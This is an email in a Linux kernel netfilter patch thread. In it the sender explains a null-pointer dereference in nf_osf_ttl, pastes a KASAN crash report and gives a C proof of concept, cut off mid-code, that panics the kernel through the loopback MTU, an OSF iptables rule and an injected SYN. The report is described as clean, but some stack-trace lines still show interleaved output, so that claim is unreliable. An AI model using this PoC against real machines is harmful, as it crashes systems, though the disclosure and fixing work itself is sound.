Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A75303B4EA2
	for <netfilter-devel@vger.kernel.org>; Tue, 14 Apr 2026 08:37:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776155845; cv=none; b=VvA9kIYa8P0U4b6Uz/FIco0GERQ2idCgc4DHG4J9FPcGHhJ8korDKYriJlyps3qBrnC+VWvXxlcvaNQc/LsfMXyUgZBMzg1gSyT3y9/XaPaK14gf/SHPnukDkRI9nN+hdZTFYKYtQ/s6YMVtJV4vH9IuIbzUDYKvpKoyt2yWFbA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776155845; c=relaxed/simple;
	bh=+1z1zeI5j9ek+1e30c43dDRGn/2ypTLxn/aPcEJv/Qo=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=qQbCVNMwy8UTcYDmML/eJ/2EHqi8Nwa0V5iQc3xmLm6P+pu2Y+Z04Zc2SvGOykUjJlOpVTFxkXh8HMVjBqABVngBYM7ierkhGeutj4YztMJ8UQHJg0/+EA1bjd9yRzkEARlP2jR3btJ7r0q69xKwtMw4IFkgreNtxg4JKsemtUI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=pOhelIAJ; arc=none smtp.client-ip=209.85.214.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="pOhelIAJ"
Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-2b458ca2296so14984675ad.0
        for <netfilter-devel@vger.kernel.org>; Tue, 14 Apr 2026 01:37:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1776155843; x=1776760643; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to;
        bh=lekNT/UJkFBQVY4q61SHd90hh6ycBRPNgQSKzVFSg3E=;
        b=pOhelIAJZ1wTEL1E3fgDpi2Nx2k/NMwWZiH18hSVs4IH4IddzdNZ1Q0YUULAIDt7qT
         0F4Bt2mIwQg0NOtZkswGSC4EWFAiiEafbDcfd8FBNhOV3LCJ4Qb5kL1Vl9lVOcAvZjM9
         EOmidLvkEigrIDYLij+dc9RkzKXHGDNPhbQkKd2/kxoFuFJ9OTuP+Xsr0LMV+bOtq1u+
         4x8vPkdsomFv34ouol9fnSJpu6GaTa6yGmyYY4gWD2s+rCpCO5bKzwwNfnr9tBR24QG3
         XmDINfdIGhU8Iw8q/y+oe9VenGX5rNBjPTu+0mcZafsdVbmagtQVOdTTqAVAC2KcoUi1
         J02w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1776155843; x=1776760643;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=lekNT/UJkFBQVY4q61SHd90hh6ycBRPNgQSKzVFSg3E=;
        b=cHHuj1F2svR8outh46yFYH8tdTUaid1OrcT/0LLU1wFqgs28IfVUcjWVoD5D+MoxsO
         sCm4T/DOJkL8g9y6yvljoP0NxqRtnBzRUCblfDNEkBINyykETj3LYoapy8868GFesslq
         /ybLAoPdzxLsg/Lic6ojdwjTQBRaOZl6KrEqgZmTLrL2SNyATuShBkNeNPiorTaabcbZ
         VK6cSHBRFn9PLmePbaVJUf5BidM3CrZwiDeixeVYNg/fWdUUSGRmUJmzReT4aNwEeUGj
         NenlozEFI+JsYyZAkw3p9sIZaHo9QVBDy9GD6LXXweqkHeOpIDBBBt9q74uOdNjVzl80
         4Yiw==
X-Forwarded-Encrypted: i=1; AFNElJ9i6MoocF0KvrUwJAxn1Lx6KnnP2QN4LQSggOXdmOS75T5hI9YrVY/3+Kg5kUNMbFRQBN8kE0xt6hsTc/YDu+8=@vger.kernel.org
X-Gm-Message-State: AOJu0YxY8GnY827m87plLo9y4XGcsY0YG/9rtX3sOqKSkdwXyZAya5OP
	nzIsNN4CUv9C9l7peoT0q2xeCOvau+FcQagU6RJOnaW/6ZynJ48+0Q8Q
X-Gm-Gg: AeBDiesqiSLlY9JOzNMkRb0VMiy2LTLVA7QbYi/wsnftKlz3dPzafraBrLce7+85b9m
	Lgqf+K26VWNweHg0nPuVM5FOZ/SIs2lfZrhFPYw7gMUg0WynvHsq8XDYTm4aeTNow+fPc4ABB2M
	+bk8XQt2GTvT3Q9Q9VlyyryqO9hObVk8LTOdYDLieUVx6icAq0RzyY4YqBG8A5ts0rGSYihJDwq
	JPz0EWna/z6jXZEUec70RScWz+m5ceGRsRBgKSO5sfLN7GXURGTRJWIfGZFSevxMBGNuykxyPwT
	grmPd7ZtlgvcVdZiZuyP2epk+qOxKuOIVQRcb88ICg2mUo46e9fsnS2j+XGGoidB5eOwJFRO6oR
	0tUNeV6MVsOFd4OsKTEUy9oa+Dn2jjXmZ9kijog2Kaq2YbqVWcEhrQmfIgPOrft5o+wtAAQDocp
	ItrngM0zRf1vgorCzkKbBzbxPjWlXTEuaA
X-Received: by 2002:a17:902:ffd0:b0:2b2:ece2:bc1b with SMTP id d9443c01a7336-2b2ece2c7demr88470065ad.26.1776155842525;
        Tue, 14 Apr 2026 01:37:22 -0700 (PDT)
Received: from localhost.localdomain ([180.167.178.215])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2b45f192203sm55652675ad.23.2026.04.14.01.37.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 14 Apr 2026 01:37:22 -0700 (PDT)
From: "Kito Xu (veritas501)" <hxzene@gmail.com>
To: pablo@netfilter.org
Cc: coreteam@netfilter.org,
	davem@davemloft.net,
	edumazet@google.com,
	ffmancera@riseup.net,
	fw@strlen.de,
	horms@kernel.org,
	hxzene@gmail.com,
	kuba@kernel.org,
	linux-kernel@vger.kernel.org,
	netdev@vger.kernel.org,
	netfilter-devel@vger.kernel.org,
	pabeni@redhat.com,
	phil@nwl.cc
Subject: Re: [PATCH] netfilter: nfnetlink_osf: fix null-ptr-deref in nf_osf_ttl
Date: Tue, 14 Apr 2026 16:37:02 +0800
Message-ID: <20260414083703.2531953-1-hxzene@gmail.com>
X-Mailer: git-send-email 2.43.0
In-Reply-To: <ad35LhIOSaEDJAhS@chamomile>
References: <ad35LhIOSaEDJAhS@chamomile>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

From: Kito Xu <hxzene@gmail.com>

Hi Pablo,

On Tue, Apr 14, 2026 at 10:22:06AM +0200, Pablo Neira Ayuso wrote:
> How could skb->dev be NULL !?

skb->dev is NOT NULL. The NULL value is `in_dev` returned by
__in_dev_get_rcu(skb->dev), because dev->ip_ptr is NULL after
inetdev_destroy().

> This is run from prerouting, input and forward.

Correct. The crash path is in PREROUTING on lo.

> I cannot believe this, I think AI is mocking KASAN splat, if that is
> the case, I am sorry to say, but it is too bad if you are doing this.

This is a real bug with a reproducible PoC. I understand the KASAN
output in my original patch email looked suspicious because it was
interleaved with the PoC's stderr output (the PoC prints debug lines
while the kernel oops scrolls by simultaneously). That was a formatting
mistake on my part.

Let me clarify the root cause and provide a clean KASAN report.

## Root Cause

nf_osf_ttl() calls __in_dev_get_rcu(skb->dev) and passes the result
to in_dev_for_each_ifa_rcu() without a NULL check:

    static inline int nf_osf_ttl(const struct sk_buff *skb,
                                  int ttl_check, unsigned char f_ttl)
    {
        struct in_device *in_dev = __in_dev_get_rcu(skb->dev);
        ...
        /* ttl_check == NF_OSF_TTL_LESS, ip->ttl > f_ttl → falls through */
        in_dev_for_each_ifa_rcu(ifa, in_dev) {   /* NULL deref when in_dev == NULL */
            ...

in_dev_for_each_ifa_rcu expands to:

    for (ifa = rcu_dereference((in_dev)->ifa_list); ...)

When in_dev is NULL, (NULL)->ifa_list is a NULL dereference at offset
0x10, which matches the KASAN report: null-ptr-deref in range
[0x0000000000000010-0x0000000000000017].

## How ip_ptr becomes NULL

The loopback driver (loopback.c) does NOT call ether_setup(), so
dev->min_mtu remains 0. This allows setting MTU below IPV4_MIN_MTU
(68). Setting lo MTU to 67 triggers:

    NETDEV_CHANGEMTU event
      → inetdev_valid_mtu(67) == false
      → inetdev_destroy(in_dev)
      → RCU_INIT_POINTER(dev->ip_ptr, NULL)

After this, lo can still receive packets (loopback_xmit → __netif_rx),
but __in_dev_get_rcu(lo) returns NULL.

## Trigger sequence

1. Load OSF fingerprint (genre=Linux, ttl=64, ttl_check=TTL_LESS)
2. Set up iptables raw PREROUTING rule with xt_osf match
3. Set lo MTU to 67 → inetdev_destroy → ip_ptr = NULL
4. Inject SYN (TTL=255 > f_ttl 64) via AF_PACKET on lo
5. ip_rcv → PREROUTING → xt_osf → nf_osf_ttl() → NULL deref

## Clean KASAN report (from separate capture, no interleaving)

```
[    2.873592] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000002: 0000 [#1] SMP KASAN NOPTI
[    2.878162] KASAN: null-ptr-deref in range [0x0000000000000010-0x0000000000000017]
[    2.881836] CPU: 0 UID: 0 PID: 169 Comm: poc Not tainted 7.0.0-rc7-next-20260410+ #11 PREEMPTLAZY 
[    2.885160] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    2.889197] RIP: 0010:nf_osf_match_one+0x204/0xa70
[    2.891768] Code: 7f 08 84 c0 0f 85 46 06 00 00 41 3a 4c 24 08 0f 83 17 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7f 10 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 f8 07 00 00 49 8b 5f 10 48 85 db 0f 84 8f fe ff
[    2.898548] RSP: 0018:ffffc90000007740 EFLAGS: 00010212
[    2.900439] RAX: dffffc0000000000 RBX: ffffc90000007878 RCX: 0000000000000040
[    2.903090] RDX: 0000000000000002 RSI: ffff88800b4f30c0 RDI: 0000000000000010
[    2.906785] RBP: ffff88800fca4820 R08: 0000000000000000 R09: 0000000000000000
[    2.909418] R10: 0000000000000001 R11: ffff88800b4b7680 R12: ffff88800b4f30d0
[    2.912058] R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000000
[    2.914978] FS:  0000000013b96380(0000) GS:ffff8880e2489000(0000) knlGS:0000000000000000
[    2.917975] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.920236] CR2: 00000000004a0000 CR3: 000000000fa3f000 CR4: 00000000003006f0
[    2.922952] Call Trace:
[    2.923947]  <IRQ>
[    2.924779]  nf_osf_match+0x2f8/0x780
[    2.926183]  ? __pfx_nf_osf_match+0x10/0x10
[    2.928630]  ? kvm_sched_clock_read+0x11/0x20
[    2.930946]  ? local_clock+0x15/0x30
[    2.933963]  ? kasan_save_track+0x26/0x60
[    2.936266]  ? __pfx__raw_spin_lock+0x10/0x10
[    2.938605]  xt_osf_match_packet+0x11c/0x1f0
[    2.940360]  len=40ipt_do_table+0x7fe/0x12b0
[    2.942846]  ? __pfx_ipt_do_table+0x10/0x10
[    2.944267]  ? __pfx___smp_call_single_queue+0x10/0x10
[    2.946109]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[    2.949929]  nf_hook_slow+0xac/0x1e0
[    2.951288]  ip_rcv+0x123/0x370
[    2.952544]  ? __pfx_ip_rcv+0x10/0x10
[    2.954789]  ? tryinc_node_nr_active+0xe6/0x160
[    2.956407]  ?netif_r __pfx_ip_rcv_finish+0x10/0x10
[    2.958990]  ? __smp_call_single_queue+0x2c7/0x480
[    2.960907]  ? __pfx_ip_rcv+0x10/0x10
[    2.962315]  __netif_receive_skb_one_core+0x166/0x1b0
[    2.964374]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[    2.966465]  ? _raw_spin_lock_irq+0x8a/0xe0
[    2.968828]  ? update_cfs_rq_load_avg+0x5a/0x560
[    2.970585]  process_backlog+0x197/0x590
[    2.973489]  __napi_poll+0xa1/0x540
[    2.974887]  net_rx_action+0x401/0xd80
[    2.976358]  ? __pfx_net_rx_action+0x10/0x10
[    2.977973]  ? timerqueue_linked_add+0x1f4/0x3d0
[    2.980634]  handle_softirqs+0x19f/0x610
[    2.982012]  pfx_handle_softirqs+0x10/0x10
[    2.984853]  do_softirq.part.0+0x3b/0x60
[    2.986360]  </IRQ>
[    2.987161]  <TASK>
[    2.987845]  __local_bh_enable_ip+0x64/0x70
[    2.989320]  __dev_queue_xmit+0x9f7/0x3100
[    2.990853]  ? kvm_clock_get_cycles+0x18/0x30
[    2.992377]  ? ktime_get+0xeb/0x160
[    2.994640]  ? __pfx_skb_set_owner_w+0x10/0x10
[    2.996116]  ? __pfx___dev_queue_xmit+0x10/0x10
[    2.997850]  ? __pfx__copy_from_iter+0x10/0x10
[    2.999529]  ? packet_parse_headers+0x342/0x6b0
[    3.002132]  ? __pfx_packet_parse_headers+0x10/0x10
[    3.003983]  ? _raw_spin_lock_irqsave+0x95/0xf0
[    3.005551]  packet_sendmsg+0x21c2/0x5580
[    3.007039]  ? tty_compat_ioctl+0x238/0x500
[    3.008445]  ? __pfx_ldsem_down_read+0x10/0x10
[    3.010973]  ? _raw_spin_lock_irqsave+0x95/0xf0
[    3.012634]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    3.014620]  ? __pfx_packet_sendmsg+0x10/0x10
[    3.016292]  ? __pfx_aa_sk_perm+0x10/0x10
[    3.017657]  ? __check_object_size+0x4b/0x650
[    3.019888]  __sys_sendto+0x34e/0x3a0
[    3.021353]  ? __pfx___sys_sendto+0x10/0x10
[    3.022854]  ? alloc_fd+0x33b/0x5b0
[    3.024081]  ? ksys_write+0xfc/0x1d0
[    3.025333]  ? __pfx_ksys_write+0x10/0x10
[    3.027069]  __x64_sys_sendto+0xe0/0x1c0
[    3.028593]  do_syscall_64+0x64/0x680
[    3.030069]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    3.032055] RIP: 0033:0x4243f7
[    3.033269] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b5 0f 1f 00 f3 0f 1e fa 80 3d 6d bc 08 00 00 41 89 ca 74 10 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 69 c3 55 48 89 e5 53 48 83 ec 38 44 89 4d d0
[    3.039978] RSP: 002b:00007ffc7ab0e508 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    3.042801] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00000000004243f7
[    3.045585] RDX: 0000000000000036 RSI: 00007ffc7ab0e590 RDI: 0000000000000003
[    3.048006] RBP: 00007ffc7ab0e5d0 R08: 00007ffc7ab0e540 R09: 0000000000000014
[    3.050552] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffc7ab0e6f8
[    3.053184] R13: 00007ffc7ab0e708 R14: 00000000004aaf68 R15: 0000000000000001
[    3.055872]  </TASK>
[    3.056758] Modules linked in:
[    3.057796] ---[ end trace 0000000000000000 ]---
[    3.059605] RIP: 0010:nf_osf_match_one+0x204/0xa70
[    3.061034] Code: 7f 08 84 c0 0f 85 46 06 00 00 41 3a 4c 24 08 0f 83 17 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7f 10 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 f8 07 00 00 49 8b 5f 10 48 85 db 0f 84 8f fe ff
[    3.067353] RSP: 0018:ffffc90000007740 EFLAGS: 00010212
[    3.069348] RAX: dffffc0000000000 RBX: ffffc90000007878 RCX: 0000000000000040
[    3.072135] RDX: 0000000000000002 RSI: ffff88800b4f30c0 RDI: 0000000000000010
[    3.074613] RBP: ffff88800fca4820 R08: 0000000000000000 R09: 0000000000000000
[    3.076982] R10: 0000000000000001 R11: ffff88800b4b7680 R12: ffff88800b4f30d0
[    3.079532] R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000000
[    3.082213] FS:  0000000013b96380(0000) GS:ffff8880e2489000(0000) knlGS:0000000000000000
[    3.085348] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.087128] CR2: 00000000004a0000 CR3: 000000000fa3f000 CR4: 00000000003006f0
[    3.089429] Kernel panic - not syncing: Fatal exception in interrupt
[    3.092322] Kernel Offset: disabled
[    3.093649] Rebooting in 1 seconds..
```

## PoC (standalone C, requires root, compiles with musl or glibc)

```c
/*
 * PoC: nf_osf_ttl() NULL pointer dereference (nfnetlink_osf.c)
 *
 * Trigger: lo MTU set to 67 (< IPV4_MIN_MTU=68) via ioctl
 *          → NETDEV_CHANGEMTU → !inetdev_valid_mtu(67)
 *          → inetdev_destroy(lo) → RCU_INIT_POINTER(lo->ip_ptr, NULL)
 *
 *          SYN injected via AF_PACKET on lo → loopback_xmit
 *          → eth_type_trans → __netif_rx → ip_rcv → PREROUTING
 *          → xt_osf → nf_osf_match → nf_osf_match_one
 *          → nf_osf_ttl(skb, TTL_LESS=1, f_ttl=64)
 *            L34: in_dev = __in_dev_get_rcu(lo) → NULL
 *            L46: in_dev_for_each_ifa_rcu(ifa, NULL) → CRASH
 *
 * Requirements (all built-in in target kernel):
 *   CONFIG_IP_NF_RAW=y, CONFIG_NETFILTER_XT_MATCH_OSF=y,
 *   CONFIG_NETFILTER_NETLINK_OSF=y, CONFIG_PANIC_ON_OOPS=y
 *
 * Run as root.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <linux/netlink.h>

/* ------------------------------------------------------------------ */
/* Inline definitions — avoid dependency on kernel UAPI headers       */
/* ------------------------------------------------------------------ */

/* netlink / netfilter */
#define NETLINK_NETFILTER       12
#define NFNETLINK_V0            0
#define NFNL_SUBSYS_OSF         5
#define NLM_F_REQUEST           0x0001
#define NLM_F_ACK               0x0004
#define NLM_F_CREATE            0x0400
#define NLMSG_ALIGNTO           4
#define NLMSG_ALIGN(len)        (((len)+NLMSG_ALIGNTO-1) & ~(NLMSG_ALIGNTO-1))
#define NLMSG_HDRLEN            ((int)NLMSG_ALIGN(sizeof(struct nlmsghdr)))
#define NLMSG_LENGTH(len)       ((len) + NLMSG_HDRLEN)
#define NLA_ALIGNTO             4
#define NLA_ALIGN(len)          (((len)+NLA_ALIGNTO-1) & ~(NLA_ALIGNTO-1))
#define NLA_HDRLEN              ((int)NLA_ALIGN(sizeof(struct nlattr)))

#define NLMSG_ERROR             0x2

struct nfgenmsg {
    __u8  nfgen_family;
    __u8  version;
    __be16 res_id;
};

/* OSF netlink */
#define OSF_MSG_ADD             0
#define OSF_ATTR_FINGER         1
#define MAXGENRELEN             32
#define MAX_IPOPTLEN            40
#define OSF_WSS_PLAIN           0

struct nf_osf_wc {
    __u32 wc;
    __u32 val;
};

struct nf_osf_opt {
    __u16 kind;
    __u16 length;
    struct nf_osf_wc wc;
};

struct nf_osf_user_finger {
    struct nf_osf_wc wss;
    __u8  ttl;
    __u8  df;
    __u16 ss;
    __u16 mss;
    __u16 opt_num;
    char  genre[MAXGENRELEN];
    char  version[MAXGENRELEN];
    char  subtype[MAXGENRELEN];
    struct nf_osf_opt opt[MAX_IPOPTLEN];
};

/* iptables / x_tables */
#define XT_TABLE_MAXNAMELEN     32
#define XT_EXTENSION_MAXNAMELEN 29
#define XT_FUNCTION_MAXNAMELEN  30
#define NF_INET_PRE_ROUTING     0
#define NF_INET_LOCAL_OUT       3
#define NF_INET_NUMHOOKS        5
#define NF_ACCEPT               1
#define IPPROTO_TCP             6
#define IPT_SO_SET_REPLACE      64
#define IPT_SO_GET_INFO         64
#define SOL_IP                  0

/* XT_ALIGN: align to 8 bytes (alignof struct with u64 member) */
#define XT_ALIGN(s)             (((s) + 7) & ~7)

struct xt_counters {
    __u64 pcnt, bcnt;
};

struct ipt_ip {
    struct in_addr src, dst;
    struct in_addr smsk, dmsk;
    char iniface[16], outiface[16];
    unsigned char iniface_mask[16], outiface_mask[16];
    __u16 proto;
    __u8  flags;
    __u8  invflags;
};

struct ipt_entry {
    struct ipt_ip ip;
    unsigned int nfcache;
    __u16 target_offset;
    __u16 next_offset;
    unsigned int comefrom;
    struct xt_counters counters;
    unsigned char elems[0];
};

struct xt_entry_match {
    union {
        struct {
            __u16 match_size;
            char  name[XT_EXTENSION_MAXNAMELEN];
            __u8  revision;
        } user;
        __u16 match_size;
    } u;
    unsigned char data[0];
};

struct xt_entry_target {
    union {
        struct {
            __u16 target_size;
            char  name[XT_EXTENSION_MAXNAMELEN];
            __u8  revision;
        } user;
        __u16 target_size;
    } u;
    unsigned char data[0];
};

struct xt_standard_target {
    struct xt_entry_target target;
    int verdict;
};

struct xt_error_target {
    struct xt_entry_target target;
    char errorname[XT_FUNCTION_MAXNAMELEN];
};

struct ipt_getinfo {
    char name[XT_TABLE_MAXNAMELEN];
    unsigned int valid_hooks;
    unsigned int hook_entry[NF_INET_NUMHOOKS];
    unsigned int underflow[NF_INET_NUMHOOKS];
    unsigned int num_entries;
    unsigned int size;
};

struct ipt_replace {
    char name[XT_TABLE_MAXNAMELEN];
    unsigned int valid_hooks;
    unsigned int num_entries;
    unsigned int size;
    unsigned int hook_entry[NF_INET_NUMHOOKS];
    unsigned int underflow[NF_INET_NUMHOOKS];
    unsigned int num_counters;
    struct xt_counters *counters;
    /* entries follow */
};

/* nf_osf_info — iptables match data for xt_osf */
#define NF_OSF_GENRE            (1 << 0)
#define NF_OSF_TTL_FLAG         (1 << 1)   /* NF_OSF_TTL in the kernel */
#define NF_OSF_TTL_LESS         1

struct nf_osf_info {
    char  genre[MAXGENRELEN];
    __u32 len;
    __u32 flags;
    __u32 loglevel;
    __u32 ttl;
};

/* IP / TCP headers for packet crafting */
struct iphdr {
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    __u8 ihl:4, version:4;
#else
    __u8 version:4, ihl:4;
#endif
    __u8  tos;
    __u16 tot_len;
    __u16 id;
    __u16 frag_off;
    __u8  ttl;
    __u8  protocol;
    __u16 check;
    __u32 saddr;
    __u32 daddr;
};

struct tcphdr {
    __u16 source;
    __u16 dest;
    __u32 seq;
    __u32 ack_seq;
#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
    __u16 res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
#else
    __u16 doff:4, res1:4, cwr:1, ece:1, urg:1, ack:1, psh:1, rst:1, syn:1, fin:1;
#endif
    __u16 window;
    __u16 check;
    __u16 urg_ptr;
};

/* AF_PACKET / Ethernet */
#ifndef AF_PACKET
#define AF_PACKET               17
#endif
#define ETH_P_IP                0x0800
#define ETH_P_ALL               0x0003
#define ETH_HLEN                14
#define ETH_ALEN                6

struct sockaddr_ll {
    unsigned short sll_family;
    __be16 sll_protocol;
    int    sll_ifindex;
    unsigned short sll_hatype;
    unsigned char  sll_pkttype;
    unsigned char  sll_halen;
    unsigned char  sll_addr[8];
};

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

#define DIE(fmt, ...) do { \
    fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__); \
    exit(1); \
} while (0)

#define LOG(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)

static __u16 ip_checksum(const void *buf, int len)
{
    const __u16 *p = buf;
    __u32 sum = 0;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1)
        sum += *(__u8 *)p;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (__u16)~sum;
}

/* ------------------------------------------------------------------ */
/* Step 1: Load OSF fingerprint via nfnetlink                         */
/* ------------------------------------------------------------------ */

static void load_osf_fingerprint(void)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (fd < 0)
        DIE("socket(NETLINK_NETFILTER): %s", strerror(errno));

    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        DIE("bind(netlink): %s", strerror(errno));

    struct nf_osf_user_finger finger;
    memset(&finger, 0, sizeof(finger));
    finger.wss.wc  = OSF_WSS_PLAIN;
    finger.wss.val = 0;
    finger.ttl     = 64;
    finger.df      = 0;
    finger.ss      = 40;
    finger.mss     = 0;
    finger.opt_num = 0;
    strncpy(finger.genre, "Linux", MAXGENRELEN);

    int finger_attr_len = NLA_HDRLEN + sizeof(finger);
    int nfmsg_len = NLMSG_ALIGN(sizeof(struct nfgenmsg)) + NLA_ALIGN(finger_attr_len);
    int total_len = NLMSG_LENGTH(nfmsg_len);

    char *buf = calloc(1, total_len);
    if (!buf) DIE("calloc");

    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len   = total_len;
    nlh->nlmsg_type  = (NFNL_SUBSYS_OSF << 8) | OSF_MSG_ADD;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK;
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_pid   = getpid();

    struct nfgenmsg *nfg = (struct nfgenmsg *)(buf + NLMSG_HDRLEN);
    nfg->nfgen_family = AF_UNSPEC;
    nfg->version      = NFNETLINK_V0;
    nfg->res_id       = 0;

    struct nlattr *nla = (struct nlattr *)(buf + NLMSG_HDRLEN +
                          NLMSG_ALIGN(sizeof(struct nfgenmsg)));
    nla->nla_len  = finger_attr_len;
    nla->nla_type = OSF_ATTR_FINGER;
    memcpy((char *)nla + NLA_HDRLEN, &finger, sizeof(finger));

    struct sockaddr_nl dest = { .nl_family = AF_NETLINK };
    if (sendto(fd, buf, total_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0)
        DIE("sendto(OSF_MSG_ADD): %s", strerror(errno));

    char rbuf[4096];
    int n = recv(fd, rbuf, sizeof(rbuf), 0);
    if (n < 0)
        DIE("recv(netlink): %s", strerror(errno));

    struct nlmsghdr *rnlh = (struct nlmsghdr *)rbuf;
    if (rnlh->nlmsg_type == NLMSG_ERROR) {
        int *errp = (int *)(rbuf + NLMSG_HDRLEN);
        if (*errp != 0)
            DIE("OSF fingerprint load failed: %s (err=%d)",
                strerror(-*errp), *errp);
    }

    LOG("OSF fingerprint loaded (genre=Linux, ttl=64, ss=40, df=0)");
    free(buf);
    close(fd);
}

/* ------------------------------------------------------------------ */
/* Step 2: Set up iptables raw table with xt_osf match                */
/* ------------------------------------------------------------------ */

#define SIZEOF_IPT_ENTRY        (XT_ALIGN(sizeof(struct ipt_entry)))
#define SIZEOF_MATCH_OSF        (XT_ALIGN(sizeof(struct xt_entry_match) + sizeof(struct nf_osf_info)))
#define SIZEOF_STD_TARGET       (XT_ALIGN(sizeof(struct xt_standard_target)))
#define SIZEOF_ERR_TARGET       (XT_ALIGN(sizeof(struct xt_error_target)))

#define ENTRY0_SIZE  (SIZEOF_IPT_ENTRY + SIZEOF_MATCH_OSF + SIZEOF_STD_TARGET)
#define ENTRY1_SIZE  (SIZEOF_IPT_ENTRY + SIZEOF_STD_TARGET)
#define ENTRY2_SIZE  (SIZEOF_IPT_ENTRY + SIZEOF_STD_TARGET)
#define ENTRY3_SIZE  (SIZEOF_IPT_ENTRY + SIZEOF_ERR_TARGET)
#define ENTRIES_SIZE (ENTRY0_SIZE + ENTRY1_SIZE + ENTRY2_SIZE + ENTRY3_SIZE)

static void setup_iptables_osf(void)
{
    int rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawfd < 0)
        DIE("socket(RAW): %s", strerror(errno));

    struct ipt_getinfo info;
    memset(&info, 0, sizeof(info));
    strncpy(info.name, "raw", XT_TABLE_MAXNAMELEN);
    socklen_t optlen = sizeof(info);
    if (getsockopt(rawfd, SOL_IP, IPT_SO_GET_INFO, &info, &optlen) < 0)
        DIE("getsockopt(IPT_SO_GET_INFO): %s", strerror(errno));

    LOG("raw table: valid_hooks=0x%x, num_entries=%u, size=%u",
        info.valid_hooks, info.num_entries, info.size);

    unsigned int old_num_entries = info.num_entries;

    size_t repl_size = sizeof(struct ipt_replace) + ENTRIES_SIZE;
    char *blob = calloc(1, repl_size);
    if (!blob) DIE("calloc");

    struct ipt_replace *repl = (struct ipt_replace *)blob;
    strncpy(repl->name, "raw", XT_TABLE_MAXNAMELEN);
    repl->valid_hooks = (1 << NF_INET_PRE_ROUTING) | (1 << NF_INET_LOCAL_OUT);
    repl->num_entries = 4;
    repl->size = ENTRIES_SIZE;

    unsigned int off0 = 0;
